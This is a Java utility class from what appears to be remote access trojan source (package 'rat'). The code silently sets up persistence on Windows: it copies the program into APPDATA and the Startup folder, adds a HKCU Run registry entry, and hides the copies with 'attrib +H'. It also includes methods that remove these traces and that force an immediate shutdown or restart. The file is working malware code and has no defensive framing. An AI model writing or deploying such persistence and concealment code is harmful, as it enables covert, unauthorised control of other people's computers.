package rat;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class Utils {

	private static final String SHUTDOWN_COMMAND = "shutdown /s /t 0";
	private static final String RESTART_COMMAND = "shutdown /r /t 0";
	private static final String STARTUP_DIRECTORY_PATH = System.getenv("APPDATA");
	private static final String STARTUP_DIRECTORY_PATH_2 = System.getenv("APPDATA") + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "Start Menu" + File.separator + "Programs" + File.separator + "Startup";
	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU" + File.separator + "Software" + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "CurrentVersion" + File.separator + "Run /v \"%s\" /d \"%s\" /f";
	private static final String STARTUP_REGISTRY_REMOVE_COMMAND = "REG DELETE HKCU" + File.separator + "Software" + File.separator + "Microsoft" + File.separator + "Windows" + File.separator + "CurrentVersion" + File.separator + "Run /v \"%s\" /f";
	private static final String HIDE_FILE_COMMAND = "attrib +H %s";

	public static void addToStartup(final Path file) throws IOException {
		final String name = file.getFileName().toString();
		final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
		final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
		
		final Path destination = Paths.get(path);
		final Path destination2 = Paths.get(path2);
		final String registryCommand = String.format(STARTUP_REGISTRY_COMMAND, name, path);
		final String hideFileCommand = String.format(HIDE_FILE_COMMAND, path);
		final String hideFileCommand2 = String.format(HIDE_FILE_COMMAND, path2);

		//createFile(path);
		//Files.deleteIfExists(destination);
		//Files.deleteIfExists(destination2);
		if(Files.notExists(destination))
			copyFile(file, destination);
		if(Files.notExists(destination2))
			copyFile(file, destination2);

		try {
			Runtime.getRuntime().exec(registryCommand);
			Runtime.getRuntime().exec(hideFileCommand);
			Runtime.getRuntime().exec(hideFileCommand2);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}

	public void removeFromStartup(final String name) {
		final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
		final String path2 = STARTUP_DIRECTORY_PATH_2 + File.separator + name;
		final String registryRemoveCommand = String.format(STARTUP_REGISTRY_REMOVE_COMMAND, name);

		deleteFile(path);
		deleteFile(path2);

		try {
			Runtime.getRuntime().exec(registryRemoveCommand);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}

	public static void shutDown() {
		try {
			Runtime.getRuntime().exec(SHUTDOWN_COMMAND);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}

	public static void restart() {
		try {
			Runtime.getRuntime().exec(RESTART_COMMAND);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}

	public static void createFile(final String path) {
		final File file = new File(path);

		try {
			file.createNewFile();
		} catch (final IOException ex) {
			ex.printStackTrace();
		}
	}

	public static boolean deleteFile(final File file) {
		try {
			return file.delete();
		} catch (final Exception ex) {
			ex.printStackTrace();

			return false;
		}
	}

	public static boolean deleteFile(final String path) {
		final File file = new File(path);

		return deleteFile(file);
	}

	public static Path copyFile(Path file, Path destination) throws IOException {
		return Files.copy(file, destination);
	}

}
